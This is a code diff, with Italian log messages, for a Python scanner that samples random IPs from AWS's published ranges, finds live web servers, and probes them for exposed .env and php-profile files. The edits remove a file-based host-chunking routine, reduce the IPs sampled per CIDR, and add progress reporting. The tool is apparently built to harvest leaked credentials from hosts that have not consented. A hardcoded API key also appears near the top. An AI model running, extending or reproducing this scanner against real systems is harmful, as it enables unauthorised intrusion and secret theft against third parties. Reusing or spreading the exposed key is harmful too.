@@ -62,7 +62,7 @@ BUNNY_API_KEY = "a34bea81-b348-49fb-a28ef869d967-3fe2-43fc"
 
 DNS_WORKERS_EC2 = 200
 DNS_TIMEOUT_EC2 = 2
-MAX_IPS_PER_CIDR = 10
+MAX_IPS_PER_CIDR = 5
 
 TOTAL_SLOTS = 2000
 NUM_WORKERS = 5
@@ -148,25 +148,6 @@ def generate_list_phpprofile_from_json_multi(site_link):
     base = site_link.rstrip('/')
     for i in range(0, len(file_phpprofile), 100):
         yield [f"{base}/{p.lstrip('/')}" for p in file_phpprofile[i:i + 100]]
-
-def chunked_hosts_multi(file_found, chunk_size=50):
-    seen = set()
-    unique = []
-    try:
-        with open(file_found, 'r', encoding='utf-8') as f:
-            for line in f:
-                url = line.strip()
-                if url and url not in seen:
-                    seen.add(url)
-                    unique.append(url)
-    except:
-        return
-    it = iter(unique)
-    while True:
-        chunk = list(islice(it, chunk_size))
-        if not chunk:
-            break
-        yield chunk
 
 def content_diablo_resp(req):
     if sys.version_info[0] < 3:
@@ -627,75 +608,6 @@ def _scan_site(site_link, site_payloads, is_fallback=False):
     except Exception as e:
         with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f: f.write(str(e) + '\n')
 
-def process_file(file_path):
-    file_name = os.path.basename(file_path)
-    print(f"\n[SCANNER] 🚀 Avvio elaborazione del file: {file_name}", flush=True)
-    for cameras in chunked_hosts_multi(file_path, chunk_size=100):
-        print(f"[SCANNER] Controllo blocco di {len(cameras)} host dal file {file_name}...", flush=True)
-        try:
-            resp_site = [
-                grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False)
-                for url in cameras
-            ]
-            merdb = grequests.map(resp_site)
-            hosts_by_site = {}
-            for r in merdb:
-                if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
-                    site_url = r.url
-                    if site_url not in hosts_by_site:
-                        hosts_by_site[site_url] = {
-                            'env': list(generate_list_env_from_json_multi(site_url)),
-                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
-                        }
-                if r: r.close()
-                
-            retry_urls = []
-            for i, r in enumerate(merdb):
-                if r is None or (r.status_code not in [requests.codes.ok, 403, 200, 206]):
-                    retry_u = get_retry_url(cameras[i])
-                    if retry_u:
-                        retry_urls.append(retry_u)
-                        
-            if retry_urls:
-                print(f"[SCANNER] Retry su {len(retry_urls)} host in HTTPS...", flush=True)
-            resp_retry = [
-                grequests.get(url, timeout=3, stream=True, verify=False, allow_redirects=False)
-                for url in retry_urls
-            ]
-            retry_responses = grequests.map(resp_retry)
-            for r in retry_responses:
-                if r is not None and r.status_code in [requests.codes.ok, 403, 200, 206]:
-                    site_url = r.url
-                    if site_url not in hosts_by_site:
-                        hosts_by_site[site_url] = {
-                            'env': list(generate_list_env_from_json_multi(site_url)),
-                            'php': list(generate_list_phpprofile_from_json_multi(site_url))
-                        }
-                if r: r.close()
-                
-            site_pool = Pool(50)
-            jobs = []
-            for site_link, site_payloads in hosts_by_site.items():
-                print(f"  [SCANNER] 🎯 Analisi target attivo: {site_link}", flush=True)
-                jobs.append(site_pool.spawn(_scan_site, site_link, site_payloads))
-            site_pool.join()
-            
-            # Pulisco la memoria del blocco
-            del hosts_by_site
-            del jobs
-                
-        except Exception as e:
-            with open(os.path.join(result_dir, 'ERROR2.txt'), 'a', encoding='utf-8') as f:
-                f.write(str(e) + '\n')
-                
-    # Alla fine della scansione di questo file, lo elimino in locale
-    print(f"\n[SCANNER] 🏁 Elaborazione terminata per: {file_name}", flush=True)
-    try:
-        os.remove(file_path)
-        print(f"[SYSTEM] File locale eliminato: {file_path}", flush=True)
-    except Exception as e:
-        print(f"[SYSTEM] Errore eliminazione locale {file_path}: {e}", flush=True)
-
 def fetch_aws_ips():
     url = "https://ip-ranges.amazonaws.com/ip-ranges.json"
     print("[AWS FETCH] Scaricamento dati IP ranges da AWS...", flush=True)
@@ -762,12 +674,15 @@ def gather_urls_cycle(cidr_pool, instance_id, cycle_num):
             all_ips.append((str(ipaddress.ip_address(first + off)), region))
 
     random.shuffle(all_ips)
-    print(f"[AWS GATHER #{cycle_num}] {len(all_ips):,} IP campionati "
+    total_ips = len(all_ips)
+    print(f"[AWS GATHER #{cycle_num}] {total_ips:,} IP campionati "
           f"({total_cidrs} CIDR × {MAX_IPS_PER_CIDR}). "
           f"DNS + TCP verify in corso ({DNS_WORKERS_EC2} thread)...", flush=True)
 
     chunk = []
     hits = 0
+    processed = 0
+    last_pct = -1
 
     for ip, region in all_ips:
         chunk.append((ip, region))
@@ -780,10 +695,20 @@ def gather_urls_cycle(cidr_pool, instance_id, cycle_num):
                     try:
                         url = future.result(timeout=DNS_TIMEOUT_EC2 + 3)
                     except Exception:
+                        processed += 1
                         continue
+                    processed += 1
                     if url and url not in seen_urls:
                         seen_urls.add(url)
                         hits += 1
+
+            pct = processed * 100 // total_ips
+            if pct >= last_pct + 10:
+                last_pct = pct - (pct % 10)
+                bad = processed - hits
+                print(f"[AWS GATHER #{cycle_num}] {pct}% ({processed:,}/{total_ips:,}) "
+                      f"— {hits} webserver, {bad} scartati", flush=True)
+
             chunk = []
 
     if chunk:
@@ -794,15 +719,18 @@ def gather_urls_cycle(cidr_pool, instance_id, cycle_num):
                 try:
                     url = future.result(timeout=DNS_TIMEOUT_EC2 + 3)
                 except Exception:
+                    processed += 1
                     continue
+                processed += 1
                 if url and url not in seen_urls:
                     seen_urls.add(url)
                     hits += 1
 
     urls = list(seen_urls)
     random.shuffle(urls)
-    print(f"[AWS GATHER #{cycle_num}] Completato: {hits} URL web server verificati "
-          f"su {len(all_ips):,} IP analizzati.", flush=True)
+    bad = processed - hits
+    print(f"[AWS GATHER #{cycle_num}] Completato: {hits} web server, {bad} scartati "
+          f"su {total_ips:,} IP analizzati.", flush=True)
     return urls
 
 def main():
